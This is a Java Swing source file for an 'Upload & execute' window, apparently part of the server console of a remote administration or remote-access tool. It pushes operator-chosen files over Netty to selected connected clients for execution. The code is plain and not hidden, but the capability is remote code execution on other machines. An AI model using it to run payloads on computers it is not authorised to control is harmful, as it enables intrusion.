/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui.impl;

import com.protocol.packets.impl.UploadExecutePacket;
import com.ctx.server.ChannelHandler;
import io.netty.channel.ChannelId;
import java.io.File;
import java.util.Arrays;
import java.util.Set;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class UploadExecuteUI extends javax.swing.JFrame
{
    private javax.swing.JPanel jPanel;
    private javax.swing.JFileChooser uploadExecuteFileChooser;
    private final Set<ChannelId> selectedClients;
    
    public UploadExecuteUI(Set<ChannelId> selectedClients) 
    {
        this.selectedClients = selectedClients;
        initComponents();
    }
    
    private void initComponents() 
    {
        setTitle("Upload & execute");
        setResizable(false);
        setAlwaysOnTop(true);
        setIconImage(getToolkit().getImage(getClass().getResource("/icons/7.png")));
        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        
        jPanel = new javax.swing.JPanel();
        uploadExecuteFileChooser = new javax.swing.JFileChooser();
        uploadExecuteFileChooser.setApproveButtonText("Upload & Execute");
        
        uploadExecuteFileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        uploadExecuteFileChooser.setMultiSelectionEnabled(true);

        uploadExecuteFileChooser.addActionListener((java.awt.event.ActionEvent evt) -> 
        {
            String actionCommand = evt.getActionCommand();
            System.out.println("Action: " + actionCommand);
            File[] files = uploadExecuteFileChooser.getSelectedFiles();
            switch (actionCommand) 
            {
                case "ApproveSelection":
                    int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to upload & execute: " + Arrays.toString(files) + " on " + selectedClients.toString());
                    if (option != 0) 
                    {

                        return;
                    }

                    for (File file : files) 
                    {
                        System.out.println("Selected files: " + file.getName());
                    }

                    UploadExecutePacket uploadExecutePacket = new UploadExecutePacket();
                    uploadExecutePacket.setFiles(files);
                    for (ChannelId channelId : selectedClients) 
                    {
                        ChannelHandler.writePacket(channelId, uploadExecutePacket);
                    }
                    JOptionPane.showMessageDialog(rootPane, "Succesfully uploaded & executed: " + Arrays.toString(files) + " | " + selectedClients.toString());
                    dispose();
                    break;
                
                case "CancelSelection":
                dispose();
                break;
            }
        });
        
  javax.swing.GroupLayout jPanelLayout = new javax.swing.GroupLayout(jPanel);
        jPanel.setLayout(jPanelLayout);
        jPanelLayout.setHorizontalGroup(
            jPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(uploadExecuteFileChooser, javax.swing.GroupLayout.DEFAULT_SIZE, 721, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanelLayout.setVerticalGroup(
            jPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(uploadExecuteFileChooser, javax.swing.GroupLayout.DEFAULT_SIZE, 358, Short.MAX_VALUE)
                .addContainerGap())
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
        
    }                              
}
